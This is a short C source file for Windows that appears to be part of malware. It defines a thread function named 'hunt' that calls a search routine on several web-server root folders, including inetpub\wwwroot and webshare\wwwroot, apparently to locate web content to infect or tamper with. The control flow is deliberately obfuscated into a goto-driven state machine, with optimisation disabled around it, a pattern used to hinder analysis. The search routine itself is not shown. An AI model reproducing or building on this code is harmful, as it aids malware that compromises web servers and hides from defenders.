#pragma optimize("", off)

#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>

DWORD WINAPI hunt(LPVOID param)
{
    (void)param;   // unused
    volatile int ctrl_state = 1;
    DWORD retval = 0;

ctrl_dispatcher:
    if (ctrl_state == 0) goto ctrl_end;
    if (ctrl_state == 1) goto ctrl_block1;
    if (ctrl_state == 2) goto ctrl_block2;
    if (ctrl_state == 3) goto ctrl_block3;
    if (ctrl_state == 4) goto ctrl_block4;
    if (ctrl_state == 5) goto ctrl_block5;
    if (ctrl_state == 6) goto ctrl_block6;
    if (ctrl_state == 7) goto ctrl_block7;

ctrl_block1:
    // (void)param already done
    ctrl_state = 2;
    goto ctrl_dispatcher;

ctrl_block2:
    search("\\wwwroot");
    ctrl_state = 3;
    goto ctrl_dispatcher;

ctrl_block3:
    search("\\www root");
    ctrl_state = 4;
    goto ctrl_dispatcher;

ctrl_block4:
    search("\\inetpub\\wwwroot");
    ctrl_state = 5;
    goto ctrl_dispatcher;

ctrl_block5:
    search("\\inetpub\\www root");
    ctrl_state = 6;
    goto ctrl_dispatcher;

ctrl_block6:
    search("\\webshare\\wwwroot");
    ctrl_state = 7;
    goto ctrl_dispatcher;

ctrl_block7:
    retval = 0;
    ctrl_state = 0;
    goto ctrl_dispatcher;

ctrl_end:
    return retval;
}

#pragma optimize("", on)
